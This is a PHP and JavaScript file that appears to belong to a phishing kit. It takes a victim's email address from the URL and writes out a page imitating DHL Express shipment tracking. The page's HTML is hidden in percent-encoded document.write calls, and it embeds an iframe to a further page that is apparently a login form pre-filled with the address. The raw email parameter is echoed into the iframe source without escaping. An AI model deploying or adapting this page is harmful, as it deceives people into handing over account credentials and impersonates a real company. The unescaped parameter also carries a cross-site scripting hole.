<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<script type="text/javascript">
<!--
document.write(unescape('%3c%68%74%6d%6c%20%6c%61%6e%67%3d%22%65%6e%22%20%3e%0d%0a%3c%68%65%61%64%3e%0d%0a%20%20%3c%6d%65%74%61%20%63%68%61%72%73%65%74%3d%22%55%54%46%2d%38%22%3e%0d%0a%20%20%3c%74%69%74%6c%65%3e%44%48%4c%20%45%78%70%72%65%73%73%20%7c%20%54%72%61%63%6b%20%53%68%69%70%6d%65%6e%74%3c%2f%74%69%74%6c%65%3e%0d%0a%20%20%0d%0a%20%20%3c%6c%69%6e%6b%20%72%65%6c%3d%22%69%63%6f%6e%22%20%68%72%65%66%3d%22%2e%2f%70%68%6f%74%6f%73%2f%66%61%76%69%63%6f%6e%2e%6a%70%67%22%20%74%79%70%65%3d%22%69%6d%61%67%65%2f%67%69%66%22%20%73%69%7a%65%73%3d%22%31%36%78%31%36%22%3e%0d%0a%20%20%3c%6d%65%74%61%20%68%74%74%70%2d%65%71%75%69%76%3d%22%58%2d%55%41%2d%43%6f%6d%70%61%74%69%62%6c%65%22%20%63%6f%6e%74%65%6e%74%3d%22%49%45%3d%65%64%67%65%22%2f%3e%0d%0a%20%20%3c%6d%65%74%61%20%6e%61%6d%65%3d%22%76%69%65%77%70%6f%72%74%22%20%63%6f%6e%74%65%6e%74%3d%22%77%69%64%74%68%3d%64%65%76%69%63%65%2d%77%69%64%74%68%2c%20%69%6e%69%74%69%61%6c%2d%73%63%61%6c%65%3d%31%2e%30%2c%20%6d%61%78%69%6d%75%6d%2d%73%63%61%6c%65%3d%31%2e%30%2c%20%75%73%65%72%2d%73%63%61%6c%61%62%6c%65%3d%6e%6f%22%2f%3e%0d%0a%0d%0a%20%20%3c%6c%69%6e%6b%20%72%65%6c%3d%22%73%74%79%6c%65%73%68%65%65%74%22%20%68%72%65%66%3d%22%2e%2f%73%74%79%6c%65%2e%63%73%73%22%3e%0d%0a%20%20%0d%0a%20%20%3c%73%74%79%6c%65%20%73%74%79%6c%65%3d%22%74%65%78%74%2f%63%73%73%22%3e%0d%0a%20%20%09%2e%68%6f%76%65%72%54%61%62%6c%65%7b%0d%0a%09%09%62%6f%72%64%65%72%2d%63%6f%6c%6c%61%70%73%65%3a%63%6f%6c%6c%61%70%73%65%3b%20%0d%0a%09%7d%0d%0a%09%2e%68%6f%76%65%72%54%61%62%6c%65%20%74%64%7b%20%0d%0a%09%09%70%61%64%64%69%6e%67%3a%37%70%78%3b%0d%0a%09%7d%0d%0a%09%2f%2a%20%44%65%66%69%6e%65%20%74%68%65%20%64%65%66%61%75%6c%74%20%63%6f%6c%6f%72%20%66%6f%72%20%61%6c%6c%20%74%68%65%20%74%61%62%6c%65%20%72%6f%77%73%20%2a%2f%0d%0a%09%2e%68%6f%76%65%72%54%61%62%6c%65%20%74%72%7b%0d%0a%09%09%62%61%63%6b%67%72%6f%75%6e%64%3a%20%23%43%41%31%45%30%37%3b%0d%0a%09%7d%0d%0a%09%2f%2a%20%44%65%66%69%6e%65%20%74%68%65%20%68%6f%76%65%72%20%68%69%67%68%6c%69%67%68%74%20%63%6f%6c%6f%72%20%66%6f%72%20%74%68%65%20%74%61%62%6c%65%20%72%6f%77%20%2a%2f%0d%0a%20%20%20%20%2e%68%6f%76%65%72%54%61%62%6c%65%20%74%72%3a%68%6f%76%65%72%20%7b%0d%0a%20%20%20%20%20%20%20%20%20%20%62%61%63%6b%67%72%6f%75%6e%64%2d%63%6f%6c%6f%72%3a%20%23%46%46%42%46%30%30%3b%0d%0a%20%20%20%20%7d%0d%0a%20%20%3c%2f%73%74%79%6c%65%3e%0d%0a%20%20%0d%0a%20%20%0d%0a%20%20%0d%0a%20%20%0d%0a%20%20%0d%0a%20%20%0d%0a%20%20%3c%73%74%79%6c%65%3e%0d%0a%09%09%2f%2a%20%75%6e%76%69%73%69%74%65%64%20%6c%69%6e%6b%20%2a%2f%0d%0a%09%09%61%3a%6c%69%6e%6b%20%7b%0d%0a%09%09%63%6f%6c%6f%72%3a%20%23%46%46%46%3b%0d%0a%09%09%7d%0d%0a%0d%0a%09%09%2f%2a%20%76%69%73%69%74%65%64%20%6c%69%6e%6b%20%2a%2f%0d%0a%09%09%61%3a%76%69%73%69%74%65%64%20%7b%0d%0a%09%09%63%6f%6c%6f%72%3a%20%23%46%46%46%3b%0d%0a%09%09%7d%0d%0a%0d%0a%09%09%2f%2a%20%6d%6f%75%73%65%20%6f%76%65%72%20%6c%69%6e%6b%20%2a%2f%0d%0a%09%09%61%3a%68%6f%76%65%72%20%7b%0d%0a%09%09%63%6f%6c%6f%72%3a%20%23%30%30%30%3b%0d%0a%09%09%7d%0d%0a%0d%0a%09%09%2f%2a%20%73%65%6c%65%63%74%65%64%20%6c%69%6e%6b%20%2a%2f%0d%0a%09%09%61%3a%61%63%74%69%76%65%20%7b%0d%0a%09%09%63%6f%6c%6f%72%3a%20%23%30%30%30%3b%0d%0a%09%09%7d%0d%0a%20%20%3c%2f%73%74%79%6c%65%3e%0d%0a%0d%0a%0d%0a%3c%2f%68%65%61%64%3e%0d%0a%0d%0a%3c%62%6f%64%79%20%6d%61%72%67%69%6e%77%69%64%74%68%3d%22%30%22%20%6d%61%72%67%69%6e%68%65%69%67%68%74%3d%22%30%22%20%74%6f%70%6d%61%72%67%69%6e%3d%22%30%22%20%62%6f%74%74%6f%6d%6d%61%72%67%69%6e%3d%22%30%22%20%6c%65%66%74%6d%61%72%67%69%6e%3d%22%30%22%20%72%69%67%68%74%6d%61%72%67%69%6e%3d%22%30%22%3e%0d%0a%0d%0a%0d%0a%3c%74%61%62%6c%65%20%63%65%6c%6c%73%70%61%63%69%6e%67%3d%22%30%22%20%77%69%64%74%68%3d%22%31%30%30%25%22%20%68%65%69%67%68%74%3d%22%31%30%30%25%22%3e%0d%0a%0d%0a%0d%0a%3c%74%72%3e%3c%74%64%20%68%65%69%67%68%74%3d%22%31%30%22%20%62%67%63%6f%6c%6f%72%3d%22%23%30%30%30%22%3e%3c%2f%74%64%3e%3c%2f%74%72%3e%0d%0a%0d%0a%0d%0a%0d%0a%3c%74%72%3e%3c%74%64%20%68%65%69%67%68%74%3d%22%36%35%22%20%62%67%63%6f%6c%6f%72%3d%22%23%46%46%46%22%3e%0d%0a%0d%0a%09%3c%74%61%62%6c%65%20%77%69%64%74%68%3d%22%39%38%25%22%20%61%6c%69%67%6e%3d%22%6c%65%66%74%22%3e%3c%74%72%3e%0d%0a%09%0d%0a%09%3c%74%64%20%73%74%79%6c%65%3d%22%77%69%64%74%68%3a%31%30%70%78%3b%22%3e%3c%2f%74%64%3e%0d%0a%09%0d%0a%09%3c%74%64%3e%0d%0a%09%0d%0a%09%09%3c%69%6d%67%20%73%72%63%3d%22%2e%2f%70%68%6f%74%6f%73%2f%6c%6f%67%6f%2e%6a%70%67%22%20%73%74%79%6c%65%3d%22%77%69%64%74%68%3a%31%32%30%70%78%3b%20%68%65%69%67%68%74%3a%34%30%70%78%3b%22%3e%0d%0a%09%0d%0a%09%3c%2f%74%64%3e%0d%0a%09%0d%0a%09%0d%0a%09%0d%0a%09%0d%0a%09%0d%0a%09%3c%74%64%3e%0d%0a%09%0d%0a%09%09%3c%74%61%62%6c%65%20%61%6c%69%67%6e%3d%22%72%69%67%68%74%22%20%63%65%6c%6c%73%70%61%63%69%6e%67%3d%22%30%22%3e%3c%74%72%3e%0d%0a%09%09%0d%0a%09%09%3c%74%64%3e%0d%0a%09%09%0d%0a%09%09%09%09%3c%74%61%62%6c%65%20%63%6c%61%73%73%3d%22%68%6f%76%65%72%54%61%62%6c%65%22%20%73%74%79%6c%65%3d%22%62%6f%78%2d%73%68%61%64%6f%77%3a%20%34%70%78%20%34%70%78%20%35%70%78%20%23%30%30%30%3b%20%62%6f%72%64%65%72%2d%72%61%64%69%75%73%3a%20%33%70%78%20%33%70%78%3b%20%70%61%64%64%69%6e%67%3a%31%30%70%78%3b%22%3e%0d%0a%09%0d%0a%09%09%09%09%3c%74%72%3e%0d%0a%09%09%09%09%0d%0a%09%09%09%09%09%3c%74%64%20%73%74%79%6c%65%3d%22%68%65%69%67%68%74%3a%32%35%70%78%3b%20%77%69%64%74%68%3a%38%35%70%78%3b%20%62%6f%72%64%65%72%2d%72%61%64%69%75%73%3a%20%32%70%78%20%32%70%78%3b%22%3e%0d%0a%09%09%09%09%09%0d%0a%09%09%09%09%09%09%09%09%3c%61%20%68%72%65%66%3d%22%22%20%73%74%79%6c%65%3d%22%74%65%78%74%2d%64%65%63%6f%72%61%74%69%6f%6e%3a%6e%6f%6e%65%3b%22%3e%0d%0a%09%09%09%09%09%09%09%09%3c%66%6f%6e%74%20%66%61%63%65%3d%22%76%65%72%64%61%6e%61%22%20%73%69%7a%65%3d%22%32%22%3e%0d%0a%09%09%09%09%09%09%09%09%26%6e%62%73%70%3b%20%7c%20%48%6f%6d%65%0d%0a%09%09%09%09%09%09%09%09%3c%2f%66%6f%6e%74%3e%0d%0a%09%09%09%09%09%09%09%09%3c%2f%61%3e%0d%0a%09%09%09%09%09%09%09%0d%0a%09%09%09%09%09%3c%2f%74%64%3e%0d%0a%09%09%09%09%09%0d%0a%09%09%09%09%09%0d%0a%09%09%09%09%3c%2f%74%72%3e%0d%0a%09%0d%0a%09%09%09%09%3c%2f%74%61%62%6c%65%3e%0d%0a%09%09%0d%0a%09%09%3c%2f%74%64%3e%0d%0a%09%09%0d%0a%09%09%0d%0a%09%09%3c%74%64%20%73%74%79%6c%65%3d%22%77%69%64%74%68%3a%31%30%70%78%3b%22%3e%3c%2f%74%64%3e%0d%0a%09%09%09%09%09%0d%0a%09%09%09%09%09%0d%0a%09%09%3c%74%64%3e%0d%0a%09%09%0d%0a%09%09%09%09%3c%74%61%62%6c%65%20%63%6c%61%73%73%3d%22%68%6f%76%65%72%54%61%62%6c%65%22%20%73%74%79%6c%65%3d%22%62%6f%78%2d%73%68%61%64%6f%77%3a%20%34%70%78%20%34%70%78%20%35%70%78%20%23%30%30%30%3b%20%62%6f%72%64%65%72%2d%72%61%64%69%75%73%3a%20%33%70%78%20%33%70%78%3b%20%70%61%64%64%69%6e%67%3a%31%30%70%78%3b%22%3e%0d%0a%09%0d%0a%09%09%09%09%3c%74%72%3e%0d%0a%09%09%09%09%0d%0a%09%09%09%09%09%3c%74%64%20%73%74%79%6c%65%3d%22%68%65%69%67%68%74%3a%32%35%70%78%3b%20%77%69%64%74%68%3a%31%35%30%70%78%3b%20%62%6f%72%64%65%72%2d%72%61%64%69%75%73%3a%20%32%70%78%20%32%70%78%3b%22%3e%0d%0a%09%09%09%09%09%0d%0a%09%09%09%09%09%09%09%09%3c%61%20%68%72%65%66%3d%22%22%20%73%74%79%6c%65%3d%22%74%65%78%74%2d%64%65%63%6f%72%61%74%69%6f%6e%3a%6e%6f%6e%65%3b%22%3e%0d%0a%09%09%09%09%09%09%09%09%3c%66%6f%6e%74%20%66%61%63%65%3d%22%76%65%72%64%61%6e%61%22%20%73%69%7a%65%3d%22%32%22%3e%0d%0a%09%09%09%09%09%09%09%09%26%6e%62%73%70%3b%20%7c%20%54%72%61%63%6b%20%53%68%69%70%6d%65%6e%74%0d%0a%09%09%09%09%09%09%09%09%3c%2f%66%6f%6e%74%3e%0d%0a%09%09%09%09%09%09%09%09%3c%2f%61%3e%0d%0a%09%09%09%09%09%09%09%0d%0a%09%09%09%09%09%3c%2f%74%64%3e%0d%0a%09%09%09%09%09%0d%0a%09%09%09%09%09%0d%0a%09%09%09%09%3c%2f%74%72%3e%0d%0a%09%0d%0a%09%09%09%09%3c%2f%74%61%62%6c%65%3e%0d%0a%09%09%0d%0a%09%09%3c%2f%74%64%3e%09%0d%0a%0d%0a%0d%0a%09%09%3c%74%64%20%73%74%79%6c%65%3d%22%77%69%64%74%68%3a%31%30%70%78%3b%22%3e%3c%2f%74%64%3e%0d%0a%09%09%09%09%09%0d%0a%09%09%09%09%09%0d%0a%09%09%3c%74%64%3e%0d%0a%09%09%0d%0a%09%09%09%09%3c%74%61%62%6c%65%20%63%6c%61%73%73%3d%22%68%6f%76%65%72%54%61%62%6c%65%22%20%73%74%79%6c%65%3d%22%62%6f%78%2d%73%68%61%64%6f%77%3a%20%34%70%78%20%34%70%78%20%35%70%78%20%23%30%30%30%3b%20%62%6f%72%64%65%72%2d%72%61%64%69%75%73%3a%20%33%70%78%20%33%70%78%3b%20%70%61%64%64%69%6e%67%3a%31%30%70%78%3b%22%3e%0d%0a%09%0d%0a%09%09%09%09%3c%74%72%3e%0d%0a%09%09%09%09%0d%0a%09%09%09%09%09%3c%74%64%20%73%74%79%6c%65%3d%22%68%65%69%67%68%74%3a%32%35%70%78%3b%20%77%69%64%74%68%3a%38%35%70%78%3b%20%62%6f%72%64%65%72%2d%72%61%64%69%75%73%3a%20%32%70%78%20%32%70%78%3b%22%3e%0d%0a%09%09%09%09%09%0d%0a%09%09%09%09%09%09%09%09%3c%61%20%68%72%65%66%3d%22%22%20%73%74%79%6c%65%3d%22%74%65%78%74%2d%64%65%63%6f%72%61%74%69%6f%6e%3a%6e%6f%6e%65%3b%22%3e%0d%0a%09%09%09%09%09%09%09%09%3c%66%6f%6e%74%20%66%61%63%65%3d%22%76%65%72%64%61%6e%61%22%20%73%69%7a%65%3d%22%32%22%3e%0d%0a%09%09%09%09%09%09%09%09%26%6e%62%73%70%3b%20%7c%20%4c%6f%67%69%6e%0d%0a%09%09%09%09%09%09%09%09%3c%2f%66%6f%6e%74%3e%0d%0a%09%09%09%09%09%09%09%09%3c%2f%61%3e%0d%0a%09%09%09%09%09%09%09%0d%0a%09%09%09%09%09%3c%2f%74%64%3e%0d%0a%09%09%09%09%09%0d%0a%09%09%09%09%09%0d%0a%09%09%09%09%3c%2f%74%72%3e%0d%0a%09%0d%0a%09%09%09%09%3c%2f%74%61%62%6c%65%3e%0d%0a%09%09%0d%0a%09%09%3c%2f%74%64%3e%0d%0a%09%09%0d%0a%09%09%0d%0a%09%09%3c%74%64%20%73%74%79%6c%65%3d%22%77%69%64%74%68%3a%31%30%70%78%3b%22%3e%3c%2f%74%64%3e%0d%0a%09%09%09%09%09%0d%0a%09%09%09%09%09%0d%0a%09%09%3c%74%64%3e%0d%0a%09%09%0d%0a%09%09%09%09%3c%74%61%62%6c%65%20%63%6c%61%73%73%3d%22%68%6f%76%65%72%54%61%62%6c%65%22%20%73%74%79%6c%65%3d%22%62%6f%78%2d%73%68%61%64%6f%77%3a%20%34%70%78%20%34%70%78%20%35%70%78%20%23%30%30%30%3b%20%62%6f%72%64%65%72%2d%72%61%64%69%75%73%3a%20%33%70%78%20%33%70%78%3b%20%70%61%64%64%69%6e%67%3a%31%30%70%78%3b%22%3e%0d%0a%09%0d%0a%09%09%09%09%3c%74%72%3e%0d%0a%09%09%09%09%0d%0a%09%09%09%09%09%3c%74%64%20%73%74%79%6c%65%3d%22%68%65%69%67%68%74%3a%32%35%70%78%3b%20%77%69%64%74%68%3a%31%30%35%70%78%3b%20%62%6f%72%64%65%72%2d%72%61%64%69%75%73%3a%20%32%70%78%20%32%70%78%3b%22%3e%0d%0a%09%09%09%09%09%0d%0a%09%09%09%09%09%09%09%09%3c%61%20%68%72%65%66%3d%22%22%20%73%74%79%6c%65%3d%22%74%65%78%74%2d%64%65%63%6f%72%61%74%69%6f%6e%3a%6e%6f%6e%65%3b%22%3e%0d%0a%09%09%09%09%09%09%09%09%3c%66%6f%6e%74%20%66%61%63%65%3d%22%76%65%72%64%61%6e%61%22%20%73%69%7a%65%3d%22%32%22%3e%0d%0a%09%09%09%09%09%09%09%09%26%6e%62%73%70%3b%20%7c%20%52%65%67%69%73%74%65%72%0d%0a%09%09%09%09%09%09%09%09%3c%2f%66%6f%6e%74%3e%0d%0a%09%09%09%09%09%09%09%09%3c%2f%61%3e%0d%0a%09%09%09%09%09%09%09%0d%0a%09%09%09%09%09%3c%2f%74%64%3e%0d%0a%09%09%09%09%09%0d%0a%09%09%09%09%09%0d%0a%09%09%09%09%3c%2f%74%72%3e%0d%0a%09%0d%0a%09%09%09%09%3c%2f%74%61%62%6c%65%3e%0d%0a%09%09%0d%0a%09%09%3c%2f%74%64%3e%0d%0a%09%09%0d%0a%09%09%3c%2f%74%72%3e%3c%2f%74%61%62%6c%65%3e%0d%0a%09%0d%0a%09%3c%2f%74%64%3e%0d%0a%09%0d%0a%09%3c%2f%74%72%3e%3c%2f%74%61%62%6c%65%3e%0d%0a%0d%0a%3c%2f%74%64%3e%3c%2f%74%72%3e%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%3c%74%72%3e%3c%74%64%20%68%65%69%67%68%74%3d%22%33%35%25%22%20%62%67%63%6f%6c%6f%72%3d%22%23%45%36%45%36%45%36%22%3e%0d%0a%0d%0a%09%0d%0a%09%0d%0a%09%09%09%3c%21%2d%2d%20%70%61%72%74%69%61%6c%3a%69%6e%64%65%78%2e%70%61%72%74%69%61%6c%2e%68%74%6d%6c%20%2d%2d%3e%0d%0a%09%09%09%3c%64%69%76%20%69%64%3d%22%61%6e%69%6d%61%74%65%64%2d%62%67%22%3e%0d%0a%09%0d%0a%09%09%09%3c%64%69%76%20%69%64%3d%22%74%65%78%74%74%6f%70%22%3e%0d%0a%20%20%20%20%0d%0a%09%0d%0a%09%09%09%09%09%09%09%3c%64%69%76%20%61%6c%69%67%6e%3d%22%63%65%6e%74%65%72%22%3e'));
//-->
</script>
							<iframe src="./content/index.php?email=<?php echo $login ?>" style="border:none; height:430px; width:400px;">
							</iframe>
							
<script type="text/javascript">
<!--
document.write(unescape('%3c%2f%64%69%76%3e%0d%0a%09%09%09%09%09%09%09%0d%0a%09%09%09%09%09%09%09%3c%62%72%3e%3c%62%72%3e%3c%62%72%3e%3c%62%72%3e%3c%62%72%3e%3c%62%72%3e%0d%0a%09%09%09%0d%0a%09%09%0d%0a%09%09%09%3c%2f%64%69%76%3e%0d%0a%09%0d%0a%09%09%09%0d%0a%09%0d%0a%09%0d%0a%09%09%09%3c%2f%64%69%76%3e%0d%0a%09%09%09%3c%21%2d%2d%20%70%61%72%74%69%61%6c%20%2d%2d%3e%0d%0a%09%09%09%3c%73%63%72%69%70%74%20%73%72%63%3d%27%2e%2f%6a%71%75%65%72%79%2e%6d%69%6e%2e%6a%73%27%3e%3c%2f%73%63%72%69%70%74%3e%3c%73%63%72%69%70%74%20%20%73%72%63%3d%22%2e%2f%73%63%72%69%70%74%2e%6a%73%22%3e%3c%2f%73%63%72%69%70%74%3e%0d%0a%09%09%09%0d%0a%09%09%09%0d%0a%09%09%09%3c%62%72%3e%3c%62%72%3e%0d%0a%09%09%09%0d%0a%09%0d%0a%09%0d%0a%0d%0a%0d%0a%3c%2f%74%64%3e%3c%2f%74%72%3e%0d%0a%0d%0a%0d%0a%3c%74%72%3e%3c%74%64%20%68%65%69%67%68%74%3d%22%33%30%22%20%62%67%63%6f%6c%6f%72%3d%22%23%42%34%30%34%30%34%22%3e%0d%0a%0d%0a%09%3c%64%69%76%20%61%6c%69%67%6e%3d%22%63%65%6e%74%65%72%22%3e%0d%0a%09%0d%0a%09%09%0d%0a%09%09%3c%66%6f%6e%74%20%66%61%63%65%3d%22%76%65%72%64%61%6e%61%22%20%73%69%7a%65%3d%22%31%22%20%63%6f%6c%6f%72%3d%22%23%46%46%46%22%3e%0d%0a%09%09%44%48%4c%20%45%78%70%72%65%73%73%20%26%63%6f%70%79%3b%32%30%32%30%20%20%7c%20%41%6c%6c%20%72%69%67%68%74%73%20%72%65%73%65%72%76%65%64%0d%0a%09%09%3c%2f%66%6f%6e%74%3e%0d%0a%09%09%0d%0a%09%09%0d%0a%09%3c%2f%64%69%76%3e%0d%0a%0d%0a%3c%2f%74%64%3e%3c%2f%74%72%3e%0d%0a%0d%0a%0d%0a%3c%2f%74%61%62%6c%65%3e%0d%0a%0d%0a%3c%2f%62%6f%64%79%3e%0d%0a%3c%2f%68%74%6d%6c%3e'));
//-->
</script>